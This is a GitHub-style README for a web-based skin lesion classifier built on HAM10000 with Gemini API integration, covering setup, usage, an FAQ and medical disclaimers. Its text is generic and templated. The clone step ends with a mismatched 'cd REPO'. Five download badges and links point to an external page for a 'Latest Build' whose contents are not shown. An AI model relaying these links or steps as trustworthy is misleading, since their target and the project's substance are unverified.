# Skin Lesion Classifier - Medical Image Classifier 2026

> **Skin Lesion Classifier is a web-based medical imaging tool backed by Python. It accepts uploaded images, assigns them to one of seven skin disease categories, and integrates with the Gemini API.**

[![Platform](https://img.shields.io/badge/Platform-Web%20application-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ryanbrooksrmyx8349/skin-disease-image-classifier?style=flat-square)](https://github.com/ryanbrooksrmyx8349/skin-disease-image-classifier)

---

<p align="center">
  <a href="https://ryanbrooksrmyx8349.github.io/skin-disease-image-classifier/">
    <img src="https://img.shields.io/badge/Download-Skin%20Lesion%20Classifier%20Latest-brightgreen?style=for-the-badge" alt="Download Skin Lesion Classifier">
  </a>
</p>

> **[Download Skin Lesion Classifier](https://ryanbrooksrmyx8349.github.io/skin-disease-image-classifier/)**

---

[Download Latest Build](https://ryanbrooksrmyx8349.github.io/skin-disease-image-classifier/)

---

## Project Overview

Skin Lesion Classifier gives users a browser interface for uploading skin images and obtaining machine learning classification results. The underlying model is connected with the HAM10000 dataset, whose examples represent seven categories of skin disease.

A web frontend, Python backend, and Gemini API connection work together in this project. The application is designed as an educational and technical example of dataset-driven modeling, medical image analysis, and browser-based machine learning workflows.

The classifications are model-generated results and must not be considered a medical diagnosis. Any clinical interpretation or health-related decision should be made with a qualified healthcare professional.

---

## Capabilities

- Submit skin images from a web browser
- Sort uploaded images into seven skin disease categories
- Build on examples from the HAM10000 dataset
- Integrate Gemini API functionality into application workflows
- Pair a web frontend with a Python backend
- Demonstrate machine learning methods for medical image analysis
- Experiment with skin disease detection from image input
- Display classification output inside a web application

---

## Getting Started

First, download the source and enter its directory:

```bash
git clone https://github.com/ryanbrooksrmyx8349/skin-disease-image-classifier.git
cd REPO
```

Install the backend's Python packages using the dependency files supplied by the project. When `requirements.txt` is available, install it with:

```bash
python -m pip install -r requirements.txt
```

Use the startup guidance in the project files to launch the backend. Once it is running, visit the supplied local address in a browser. Projects where the frontend runs independently should be configured according to its included instructions before opening the application.

---

## Running the Classifier

1. Launch the Python backend.
2. Navigate to the web interface in a modern browser.
3. Choose a skin lesion image with the upload control.
4. Send the image for processing.
5. Examine the category returned by the application along with any additional information it provides.
6. Treat the result as an educational or experimental output, not as professional medical advice.

---

## Gemini API Setup

Some application workflows may need a Gemini API credential. Follow the configuration approach expected by the project and, where possible, provide the credential through an environment variable instead of placing it in source code.

For example, on a Unix-like shell:

```bash
export GEMINI_API_KEY="your-api-key"
```

For Windows PowerShell:

```powershell
$env:GEMINI_API_KEY="your-api-key"
```

Refer to the backend configuration files to verify the exact environment variable name and the startup options used by this application.

---

## Prerequisites

- A current web browser
- Python for running the backend
- Internet connectivity when Gemini API features are active
- Enough disk space for the application and its model or dataset files
- The HAM10000 dataset or the model assets required by the project
- A Gemini API key configured for functionality that communicates with Gemini

---

## Frequently Asked Questions

### What kind of users will find this useful?

The project is intended for developers, students, and researchers investigating skin lesion classification, machine learning, HAM10000-oriented workflows, and medical imaging applications delivered through a browser.

### How can I bring the application up to date?

Either download the newest build from the project link or update a local checkout with:

```bash
git pull
```

Before restarting the backend, check whether the updated project introduces dependency changes.

### Where does the Gemini credential belong?

Configure it through the backend's environment or configuration system. API keys should remain outside committed source files; inspect the project code to confirm the required variable name.

### What can I check when an upload does not work?

Confirm that the backend is active, that the browser can access its local address, and that the selected image uses a format accepted by the application. Also verify that the server can reach the model resources it needs.

### Why might the classification disagree with a doctor's assessment?

The application generates predictions from its model and training data rather than performing a clinical evaluation. Its output is not a diagnosis and should not be used to make treatment decisions without review by a qualified professional.

### How should I submit a problem report?

Create a repository issue and include your operating system, browser, startup command, useful logs, and reproducible steps. Do not upload private medical images or personal health information.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
